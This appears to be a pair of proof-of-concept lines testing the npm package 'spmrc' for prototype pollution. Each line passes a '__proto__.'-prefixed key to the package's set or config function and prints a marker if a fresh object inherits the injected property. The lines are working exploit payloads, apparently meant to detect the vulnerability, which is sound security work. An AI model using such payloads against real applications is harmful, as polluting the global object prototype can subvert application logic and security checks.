
require('spmrc').set('__proto__.pollutedProperty', 'exploitValue'); console.log({}.pollutedProperty !== undefined ? '[POLLUTION_TRIGGERED]':'');

require('spmrc').config('__proto__.polluted', 'vulnerable'); console.log({}.polluted !== undefined ? '[POLLUTION_TRIGGERED]':'')